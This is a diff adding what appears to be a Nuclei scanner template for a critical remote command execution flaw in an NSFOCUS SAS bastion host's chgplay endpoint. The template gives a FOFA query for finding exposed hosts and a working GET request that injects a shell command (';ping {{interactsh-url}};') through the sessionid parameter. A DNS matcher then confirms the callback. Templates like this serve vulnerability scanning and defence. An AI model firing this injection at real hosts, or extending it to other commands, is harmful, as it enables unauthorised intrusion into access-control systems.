@@ -1,0 +1,22 @@
+id: nsfocus-sas-chgplay-rce
+
+info:
+  name: 绿盟 SAS堡垒机 chgplay 远程命令执行漏洞
+  author: unknow
+  severity: critical     
+  metadata:
+    max-request: 3
+    fofa-query: body="needUsbkey.php?username"
+    verified: true
+  tags: nsfocus,iot,rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webconf/log/chgplay?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&status=charset&speed=10&sessionid=%3Bping%20{{interactsh-url}}%3B"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
